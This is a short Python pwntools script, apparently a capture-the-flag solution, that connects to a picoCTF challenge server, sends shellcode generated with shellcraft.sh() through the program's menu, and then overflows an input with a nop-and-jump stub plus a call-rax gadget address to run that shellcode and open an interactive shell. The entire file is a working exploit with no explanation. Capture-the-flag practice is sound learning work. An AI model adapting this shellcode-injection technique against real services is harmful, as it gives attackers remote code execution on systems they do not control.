from pwn import *

context.arch = 'amd64'

# HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'shape-facility.picoctf.net', 51445
r = remote(HOST, PORT)

call_rax = 0x401014
sh = asm(shellcraft.sh())
jmp_sh = asm(
'''
nop
nop
nop
nop
nop
sub rax, 0x200
sub rax, 0xcc
jmp rax
''')

r.sendlineafter('app\n', '1')
r.sendlineafter('name: \n', 'A' * 8)
r.sendlineafter('app\n', '2')
r.sendlineafter('to?\n', '0')
r.sendlineafter('them?\n', sh)
r.sendlineafter('app\n', '3')
r.sendlineafter('it: \n', jmp_sh.ljust(20, b'A') + p64(call_rax))

r.interactive()